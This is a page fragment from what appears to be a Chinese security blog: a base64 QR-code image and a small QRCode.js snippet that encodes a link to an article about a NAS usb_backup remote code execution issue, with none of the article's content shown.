egKn27a0R1wS48de0fUJw7im0CKEB++33y4d9LL9lQUxO03T4+SE0wNTtVQH9ZqnGonLHirMmBG49lSsg1tBR/BjeJ6M9mXNu7Qjty2ivOa8zWhNm3jnE1+G1cDkQGXa89gSmgWiaY1SPlD1wP2mINdBKgdurHWhcToCmQ+R5jzF3LYQXOlo7i9BrvU9VC+d8roXuN5ex2msaSC74nXx3XZ3AHsjqdN6gtbffvTesrxl0HSL31TO6l9BcRvEKiHq4/4eAvfIooPsgcvEKezNCeABZbgHcviXeFif+A+GHjtUeq1bZ77zyWxPuG1Kd0Bu59oshxCshPwvMnHVN0wH3PvNCuNdUL16hfAwIP9AkeY+ima4JcLsF2Xul7z4hPNDxzvC1yD2cQ68x92W/A2vQ/XCc5+J9Q/JpfEC+B/IBQ8iP0H6o+5pVCP26uRg65xprjxCi1nVCmDn3gdBgjSu/Ne3lqDiY97CvQgi/ewph5qraits3pDqVN3JtIBBThY5+Lk19FdBr4D53j4zu9YizXvlHzZ4R7avQ3qyZy2g9cxBfpzl7MkJ4gExPOXD7xwjw97zbe/lLPtoN+Uu+nv/7L+PbA4F+zcZT8DXOCMd+1UPX4T6Xrsj9tD4K6PX2uBa6BnNuP3TNXIUQvkrzno8w1357ILnJzn/uBNpAPMWzre2vsOqRfdYhXl1Qv5flGug+iLzS3HeFrhPap9yx4iD2Bmxr//dSoP1gHnvJDKErd0Bw9gvbQGza+N4T2AN57/lPuy8HAnGlYI1jV5j9o+doDb129OhKO0btaG0/RN/KB6EBTQbat6BGFgmEL0sQHHQcnwPIJS1fDqS5dvKyE2hvv3tHT/IZdC1we1V5fYQw+yC4vC/cc7kf3Guqg5nLNWOuGkXmIXpkzrm8joqzZrRHCHPfyrdviE7rMF4vtHd7ISYIz6Mf2xPPaA16X3MVwuyD4Cp/5rxv5sYcohd0zJ5VD6hrVA/HmnSH+wvNZdw3JJ/GB+R7IB8whPwIbSC6Qs9EbuIc+rWFyN3TnozWhOaVH4U9Qnsg9oGO0o/CdUJ7lDvMZYTonbkxd71w1B6tIfoD++33y4d9tBvi54I+LZhz+yrUq0Ox0qQ7Kh8c7wldq2rNQfdB5NWe5iA80NG9hPYpHwN6Ddzn2bvqYU04DSQ32fnrT2AP5PVnvtzxVwaiq+eAuMbVU0Bo0N9+X/ncU1j5xB8FxF65DmbO9ZXPmtC68jEqzRzEnlDjrwzEm2+sT2DF/spAoE+/2hxCz68smDnX2gfhASyVCNzeUwMmHWia+06mK2FNeF1On+IV0PtB5DZDrAFT7Q9aqjWp3PErA/FGG58/gT2Q58/sVyumgfjqHOGzT+M+ua7isu589HktHD3PcPIqgNu3L+UO9z2Lrqsw94DYCzq6Bjo3DSQ32fnrT6ANBPqU4HG+elRPXmgf9J7mMsqryNyzOfQ94HGu/RTQvd4TOiePwlpG6D64z7Nvlau3ow1kVbC1153AHsjrzvrUTv8DAAD//9PuPVkAAAAGSURBVAMAVN8Mm7+whFYAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-usb\_backup-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 